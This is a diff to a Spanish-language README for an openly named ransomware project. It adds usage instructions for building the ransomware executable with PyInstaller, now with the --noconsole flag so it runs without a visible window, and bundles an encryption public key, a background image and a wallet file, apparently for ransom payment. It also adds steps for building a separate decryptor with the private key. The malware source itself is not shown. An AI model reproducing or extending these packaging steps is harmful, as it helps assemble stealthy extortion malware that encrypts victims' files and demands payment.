@@ -11,6 +11,8 @@ El ransomware **necesita** permisos de administrador para poder ejecutarse. No e
 
 
 
+## Instrucciones de uso
+
 Para crear el entorno virtual, ejecutar el siguiente comando:
 
 ```bash
@@ -32,5 +34,13 @@ pip install -r requirements.txt
 Para crear el ejecutable, ejecutar el siguiente comando:
 
 ```bash
-pyinstaller --onefile --add-data "public_key.pem;." --add-data "fondo.png;." --add-data "wallet.txt;." main.py
+pyinstaller --onefile --noconsole --add-data "public_key.pem;." --add-data "fondo.png;." --add-data "wallet.txt;." main.py
+```
+
+## Instrucciones para desencriptar los archivos
+
+Para desencriptar los archivos hay que crear el ejecutable con el siguiente comando:
+
+```bash
+pyinstaller --onefile --add-data "private_key.pem;." decrypt.py
 ```
